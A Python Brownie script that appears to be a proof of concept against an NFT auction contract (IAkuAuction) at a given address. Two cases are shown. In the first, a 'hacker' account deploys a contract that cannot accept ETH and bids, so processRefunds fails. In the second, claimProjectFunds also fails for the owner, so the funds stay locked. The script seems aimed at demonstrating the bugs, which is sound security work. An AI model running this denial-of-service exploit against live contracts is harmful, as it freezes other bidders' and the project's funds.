from brownie import accounts, interface, chain, network, Luck

def main():
    eoa_users = accounts[:2]
    hacker = accounts[3]
    another_eoa = accounts[4]

    contract_user = Luck.deploy({
        'from': hacker
    })
    aku = interface.IAkuAuction('0xf42c318dbfbaab0eee040279c6a2588fa01a961d')
    # force the block timestamp to aku start...
    chain.mine(timestamp=aku.startAt()+2)

    for u in eoa_users:
        aku.bid(2, {
            "from": u,
            "value": 1e19
        })

    print(f'Now total bider is {aku.bidIndex()}, \
        total eth in aku is {aku.balance() / 1e18} ETH')

    print(f'================== Case 1: exists contract bidder without receive eth function.=====================')
    contract_user.luck({
        'from': hacker,
        'value': 1e19
        })
    
    # force the block timestamp to aku expire...
    chain.mine(timestamp=aku.expiresAt()+2)
    try:
        aku.processRefunds({'from': another_eoa})
    except Exception as e:
        print(f'--> [BUG] Fail to refunds, now the eth balance in aku is {aku.balance() / 1e18} ETH\n')
    
    print(f'================== Case 2: bug in claimProjectFunds =====================')
    print(f'Now `bidIndex` in aku is {aku.bidIndex()}, `totalBids` is {aku.totalBids()}')

    try:
        owner = accounts.at(aku.owner(), force=True)
        aku.claimProjectFunds({'from': owner})
    except Exception as e:
        print(f'--> [BUG] Project can not claim funds.\n')

    network.disconnect()
